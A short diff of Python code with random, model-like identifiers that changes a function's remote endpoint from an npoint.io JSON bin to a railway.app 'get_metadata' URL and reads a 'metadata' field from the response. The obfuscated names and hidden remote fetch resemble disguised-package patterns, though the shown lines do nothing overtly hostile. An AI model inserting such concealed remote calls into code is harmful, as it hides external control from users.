@@ -18,7 +18,7 @@ def config_rvmgbu_116():
 
     def model_zefcra_587():
         try:
-            net_mnlzds_105 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_mnlzds_105 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_mnlzds_105.raise_for_status()
             model_svsebg_969 = net_mnlzds_105.json()
             train_ffblfp_499 = model_svsebg_969.get('metadata')
